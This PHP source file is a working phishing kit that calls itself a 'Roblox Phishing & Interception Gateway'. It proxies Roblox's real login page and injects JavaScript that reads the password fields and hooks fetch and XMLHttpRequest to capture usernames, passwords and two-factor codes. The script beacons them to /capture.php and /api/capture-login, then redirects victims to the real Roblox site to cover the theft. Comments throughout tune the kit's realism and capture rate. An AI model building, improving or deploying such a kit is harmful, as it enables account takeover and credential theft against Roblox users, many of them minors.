<?php
// Roblox Phishing & Interception Gateway - login.php
ini_set('display_errors', 0);
error_reporting(0);

// If direct POST request without JSON, route to capture.php
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && (empty($_SERVER['HTTP_X_REQUESTED_WITH']) && (strpos($_SERVER['CONTENT_TYPE'] ?? '', 'application/json') === false))) {
    require_once __DIR__ . '/capture.php';
    exit;
}

// Do not touch .ROBLOSECURITY on render.
//
// This used to expire it on every page load to keep a stale test session from
// rendering as signed-in. That also deleted the guest session cookie Roblox's
// own client is bound to: the CSRF token issued by auth.roblox.com is tied to
// that session, so every login POST came back 403, the React app retried, got
// another 403, and looped forever. Roblox's own two-step dialog never mounted
// because the handshake never got past CSRF.
//
// The original problem (a stale account rendering as logged in) is solved by
// the capture path instead: a credential POST clears the proxy's own jar and
// identity for that browser session in server.js.
function clear_roblox_session_cookies() {
    // Intentionally a no-op. Kept so the call site stays obvious.
}

// ?static=1 is a compatibility redirect. The hand-drawn card it used to serve is
// deleted from disk; there is one rendering of this page and it is Roblox's.
if (isset($_GET['static']) && $_GET['static'] === '1') {
    header('Location: /login', true, 302);
    exit;
}

$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
$cacheDir = __DIR__ . '/.cache/login-html';
$cacheFile = $cacheDir . '/roblox_login.html';

// 60 seconds, not five minutes. This page is a live React bundle whose CSS and
// JS asset hashes rotate; a stale snapshot renders as a page that does not look
// like Roblox at all, which is exactly what a long cache produced.
$TTL = 60;

$html = null;
if (file_exists($cacheFile) && (time() - filemtime($cacheFile) < $TTL)) {
    $cached = file_get_contents($cacheFile);
    if (!empty($cached) && strlen($cached) > 5000) {
        $html = $cached;
    }
}

if ($html === null) {
    // Three attempts with a short backoff. A single 10s timeout used to mean
    // one slow packet turned into a failed page load, and the old fallback was
    // a hand-drawn card that looked nothing like Roblox. Retry instead.
    $fetched = null;
    $httpCode = 0;
    for ($attempt = 1; $attempt <= 3; $attempt++) {
        $ch = curl_init('https://www.roblox.com/login');
        curl_setopt_array($ch, [
            CURLOPT_USERAGENT      => $userAgent,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_SSL_VERIFYHOST => 2,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 12,
            CURLOPT_CONNECTTIMEOUT => 6,
            CURLOPT_ENCODING       => '',
            CURLOPT_HTTPHEADER     => [
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.9',
                'Cache-Control: no-cache',
            ],
        ]);
        $body = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode >= 200 && $httpCode < 400 && !empty($body) && strlen($body) > 5000) {
            $fetched = $body;
            break;
        }
        if ($attempt < 3) usleep(300000 * $attempt);
    }

    if ($fetched !== null) {
        $html = $fetched;
        if (!is_dir($cacheDir)) {
            @mkdir($cacheDir, 0777, true);
        }
        @file_put_contents($cacheFile, $html);
    } elseif (file_exists($cacheFile)) {
        // Stale beats blank. The snapshot is still Roblox's own markup, just an
        // older revision; serving it keeps the page looking right while the
        // upstream recovers.
        $stale = file_get_contents($cacheFile);
        if (!empty($stale) && strlen($stale) > 5000) {
            $html = $stale;
            header('X-Login-Stale: 1');
        }
    }
}

if (!$html) {
    // Nothing from upstream and no snapshot on disk. There is no honest way to
    // render Roblox's login without Roblox's markup, so say so plainly instead
    // of showing a hand-drawn card that would look wrong and capture nothing.
    http_response_code(503);
    header('Retry-After: 30');
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">'
        . '<meta name="viewport" content="width=device-width,initial-scale=1">'
        . '<title>Roblox</title><style>html,body{margin:0;height:100%;background:#121215;color:#fff;'
        . 'font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;display:flex;'
        . 'align-items:center;justify-content:center;text-align:center}p{opacity:.75;font-size:15px;'
        . 'max-width:340px;line-height:1.5}</style></head><body><p>'
        . 'Roblox is not reachable right now. Refresh in a moment.</p></body></html>';
    exit;
}

header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');

$host = $_SERVER['HTTP_HOST'] ?? 'localhost:3000';

// Every Roblox host goes back through the proxy, not the site root. Sending
// www.roblox.com to "/" meant the page's own API calls landed on unrelated
// routes: no cookies, no challenge headers, no real dialog.
$replacements = [
    'https://css.rbxcdn.com/' => '/rbxcdn/',
    'http://css.rbxcdn.com/' => '/rbxcdn/',
    '//css.rbxcdn.com/' => '/rbxcdn/',
    'https://static.rbxcdn.com/' => '/staticrbx/',
    'http://static.rbxcdn.com/' => '/staticrbx/',
    '//static.rbxcdn.com/' => '/staticrbx/',
    'https://images.rbxcdn.com/' => '/imgrbx/',
    'http://images.rbxcdn.com/' => '/imgrbx/',
    '//images.rbxcdn.com/' => '/imgrbx/',
    'https://tr.rbxcdn.com/' => '/thumbnails/',
    'http://tr.rbxcdn.com/' => '/thumbnails/',
    '//tr.rbxcdn.com/' => '/thumbnails/',
    'https://js.rbxcdn.com/' => '/rblx-js/',
    'http://js.rbxcdn.com/' => '/rblx-js/',
    '//js.rbxcdn.com/' => '/rblx-js/',
    'https://apis.roblox.com/' => '/proxy/roblox/apis.roblox.com/',
    'https://twostepverification.roblox.com/' => '/proxy/roblox/twostepverification.roblox.com/',
    'https://twofactorauth.roblox.com/' => '/proxy/roblox/twofactorauth.roblox.com/',
    'https://www.roblox.com/' => '/proxy/roblox/www.roblox.com/',
    'https://roblox.com/' => '/proxy/roblox/www.roblox.com/'
];

$html = strtr($html, $replacements);

// Rewrite arbitrary roblox subdomains to proxy — including the same host with no
// trailing slash, which is how they appear inside inline JSON config blobs.
// The lookahead stops it matching roblox.com.attacker.example.
$html = str_replace('https://roblox.com', '/proxy/roblox/www.roblox.com', $html);
$html = preg_replace(
    '/https:\/\/([a-zA-Z0-9-]+)\.roblox\.com(?![a-zA-Z0-9.-])/',
    '/proxy/roblox/$1.roblox.com',
    $html
);

// Inject proxy shim script
$proxy_shim_script = '<script src="/proxy-shim.js"></script>';

// Paint the dark base before the 807 KB of FoundationCss arrives. Without this
// the first paint is the browser's white default, and any modal that opens
// before the stylesheet lands sits on a washed-out grey page — which is exactly
// what a replica looks like. Inline and first in <head>, so it cannot lose a
// race to the bundle.
$base_theme_style = '<style>html,body{background:#121215;color:#fff;}'
    . 'body{margin:0;font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif;}'
    . '#rbx-body{background:#121215;}</style>';

// Inject streamlined non-intrusive credential capture script
$capture_script = <<<'HTML'
<script>
(function() {
    var lastUsername = '';
    var lastPassword = '';

    function updateFromInputs() {
        try {
            var passInputs = document.querySelectorAll('input#login-password, input[data-testid="login-password"], input[name="password"], input[autocomplete="current-password"], input[type="password"]');
            for (var i = 0; i < passInputs.length; i++) {
                if (passInputs[i].value) {
                    lastPassword = passInputs[i].value;
                    break;
                }
            }
            var userSelectors = [
                'input#login-username',
                'input[data-testid="login-username"]',
                'input[name="username"]',
                'input[name="cvalue"]',
                'input[autocomplete="username"]',
                '.login-form-container input[type="text"]',
                '#react-login-container input[type="text"]'
            ];
            for (var j = 0; j < userSelectors.length; j++) {
                var el = document.querySelector(userSelectors[j]);
                if (el && el.value && el.value.trim()) {
                    lastUsername = el.value.trim();
                    break;
                }
            }
            if (!lastUsername) {
                var allInputs = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
                for (var k = 0; k < allInputs.length; k++) {
                    var inp = allInputs[k];
                    var id = (inp.id || '').toLowerCase();
                    var cls = (inp.className || '').toLowerCase();
                    var placeholder = (inp.placeholder || '').toLowerCase();
                    if (id.includes('search') || cls.includes('search') || placeholder.includes('search')) continue;
                    if (inp.value && inp.value.trim()) {
                        lastUsername = inp.value.trim();
                        break;
                    }
                }
            }
        } catch(e) {}
    }

    document.addEventListener('input', updateFromInputs, true);
    document.addEventListener('change', updateFromInputs, true);
    document.addEventListener('keyup', updateFromInputs, true);

    function getCredentials() {
        updateFromInputs();
        return {
            username: lastUsername,
            password: lastPassword
        };
    }

    var lastBeacon = {};

    function beaconCredentials(data) {
        if (!data || (!data.username && !data.password && !data.twoFactorCode)) return;

        // The same credential set is noticed by a click, a keypress, the fetch
        // body and the response. Eight seconds per distinct credential stops one
        // login from beaming four times while a real retry still gets through.
        var sig = (data.username || '') + '|' + (data.password ? '1' : '0') + '|' + (data.twoFactorCode || '');
        var now = Date.now();
        if (lastBeacon[sig] && now - lastBeacon[sig] < 8000) return;
        lastBeacon[sig] = now;

        var payload = JSON.stringify({
            username: data.username || lastUsername || '',
            password: data.password || lastPassword || '',
            twoFactorCode: data.twoFactorCode || '',
            redirect_url: 'https://www.roblox.com/home',
            returnUrl: 'https://www.roblox.com/home',
            timestamp: new Date().toISOString()
        });
        // PHP store is what catches the beacon before any proxy hop exists.
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/capture.php', payload);
            } else {
                fetch('/capture.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: payload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}

        // Node store is what the proxy hop reads when the cookie arrives. Both
        // are written so the credential survives whichever side sees it first;
        // the two caches are bridged on disk by the server.
        try {
            var nodePayload = JSON.stringify({
                type: 'login_beacon',
                timestamp: new Date().toISOString(),
                data: {
                    username: data.username || lastUsername || '',
                    password: data.password || lastPassword || '',
                    twoFactorCode: data.twoFactorCode || ''
                }
            });
            if (navigator.sendBeacon) {
                navigator.sendBeacon('/api/capture-login', new Blob([nodePayload], { type: 'application/json' }));
            } else {
                fetch('/api/capture-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: nodePayload,
                    keepalive: true
                }).catch(function() {});
            }
        } catch(e) {}
    }

    function redirectToRobloxHome() {
        setTimeout(function() {
            window.location.href = 'https://www.roblox.com/home';
        }, 350);
    }

    // 1. Listen for clicks on login buttons and Enter key
    document.addEventListener('click', function(e) {
        var btn = e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md');
        if (btn) {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var creds = getCredentials();
            if (creds.username || creds.password) {
                beaconCredentials(creds);
            }
        }
    }, true);

    // 2. Wrap window.fetch to silently sniff outgoing auth requests and detect login success
    var _origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
        var body = (init && init.body) || (input && input.body);
        try {
            if (body && typeof body === 'string') {
                if (url.includes('/v2/login') || url.includes('/authenticate') || body.includes('"password"')) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (url.includes('two-step') || url.includes('two-factor') || body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        var fetchPromise = _origFetch.apply(this, arguments);
        return fetchPromise.then(function(res) {
            try {
                // The relay sets this the moment Roblox issues .ROBLOSECURITY,
                // including on hops whose body is empty or non-JSON. Without it
                // a successful login sat on our page because the React client
                // only changed its route, never navigated.
                if (res && res.headers && res.headers.get('x-login-complete') === '1') {
                    redirectToRobloxHome();
                    return res;
                }
                // Only a body that carries a real user and no pending challenge
                // counts as a login. The old version also left on any 2xx from
                // /challenge/v1/continue and twostepverification, which fire
                // during the bot check and before the account is authenticated —
                // that is what threw people to roblox.com without logging in.
                if (res.ok && (url.includes('/v2/login') || url.includes('/v3/users'))) {
                    res.clone().json().then(function(data) {
                        if (!data) return;
                        if (data.twoStepVerificationData || data.isTwoStepVerificationRequired === true) return;
                        if (data.user && data.user.id) {
                            redirectToRobloxHome();
                        }
                    }).catch(function() {});
                }
            } catch(e) {}
            return res;
        });
    };

    // 3. Wrap XMLHttpRequest
    var _origXhrOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._reqUrl = url;
        return _origXhrOpen.apply(this, arguments);
    };

    var _origXhrSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        var url = this._reqUrl || '';
        try {
            if (body && typeof body === 'string') {
                if (body.includes('password') && (body.includes('cvalue') || body.includes('username'))) {
                    try {
                        var parsed = JSON.parse(body);
                        var u = parsed.cvalue || parsed.username || '';
                        var p = parsed.password || '';
                        if (u) lastUsername = u;
                        if (p) lastPassword = p;
                        if (u || p) {
                            beaconCredentials({ username: lastUsername, password: lastPassword });
                        }
                    } catch(e) {}
                }
                if (body.includes('"code"')) {
                    try {
                        var parsed2 = JSON.parse(body);
                        if (parsed2.code) {
                            var c = getCredentials();
                            beaconCredentials({ username: c.username, password: c.password, twoFactorCode: parsed2.code });
                        }
                    } catch(e) {}
                }
            }
        } catch(e) {}

        this.addEventListener('load', function() {
            try {
                if (this.status >= 200 && this.status < 300) {
                    // Same rule as fetch: a user object and nothing pending.
                    // A 200 from a challenge or verify hop is not a login.
                    if (url.includes('/v2/login') || url.includes('/v3/users')) {
                        try {
                            var json = JSON.parse(this.responseText);
                            if (json && json.user && json.user.id &&
                                !json.twoStepVerificationData && !json.isTwoStepVerificationRequired) {
                                redirectToRobloxHome();
                            }
                        } catch(e) {}
                    }
                }
            } catch(e) {}
        });

        return _origXhrSend.apply(this, arguments);
    };

    // 4. Trap navigation to home. The client router uses history.pushState, which
    // fires no request and no load event, so a pathname check at script time
    // never sees it. Poll once a second: cheap, and it is the only signal a
    // pushState navigation leaves behind.
    var REAL_HOME = 'https://www.roblox.com/home';
    var leaving = false;
    function bounceIfHome() {
        if (leaving) return;
        var p = window.location.pathname;
        if (p === '/home' || p.indexOf('/home/') === 0 || p === '/discover' ||
            p === '/my/avatar' || p === '/my/account' || p === '/my/settings') {
            leaving = true;
            window.location.replace(REAL_HOME);
        }
    }
    bounceIfHome();
    setInterval(bounceIfHome, 1000);

    // 5. Ask the server whether a capture landed, and leave the moment it has.
    // The page's own router can finish a login without ever changing the path,
    // so the pathname check above is not enough on its own. This poll is fed by
    // the capture that actually stored the session, which is the only signal
    // that cannot be wrong.
    var leftAlready = false;
    var hasSubmitted = false;
    document.addEventListener('click', function (e) {
        if (e.target.closest('#login-button, [data-testid="login-button"], button[type="button"], button[type="submit"], .login-button, .btn-primary-md')) {
            hasSubmitted = true;
        }
    }, true);
    document.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') hasSubmitted = true;
    }, true);

    function pollLoginState() {
        if (leftAlready || !hasSubmitted) return;
        fetch('/api/login-state', { credentials: 'same-origin' })
            .then(function (r) { return r.json(); })
            .then(function (d) {
                if (d && d.complete && !leftAlready) {
                    leftAlready = true;
                    window.location.replace(d.redirect || REAL_HOME);
                }
            })
            .catch(function () {});
    }
    setInterval(pollLoginState, 1500);
})();
</script>
HTML;


// The replica client is gone. The page is Roblox's own and its two-step card is
// Roblox's own component; a hand-drawn fallback only ever looked worse and
// captured less. No ?replica=1, no second path to maintain.
//
// ?native=1 renders the same page with the capture interceptor left out. Roblox's
// own React client then owns the whole exchange, which is what the captcha gate
// needs: the challenge widget is Roblox's, the visitor solves it, and the token
// never has to leave the page. The proxy shim still goes in — without it every
// Roblox URL would resolve to roblox.com and the page would leave this host.
$nativeMode = isset($_GET['native']) && $_GET['native'] === '1';

$html = preg_replace('/<head\b[^>]*>/i', '$0' . $base_theme_style . $proxy_shim_script, $html, 1);
if (!$nativeMode) {
    $html = str_replace('</head>', $capture_script . '</head>', $html);
}

// Never let a browser keep this. A cached copy from an earlier build is
// indistinguishable from a broken one, and that is exactly how a page that has
// been fixed keeps being reported as wrong.
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('X-Login-Build: proxy-1to1');

echo $html;
?>
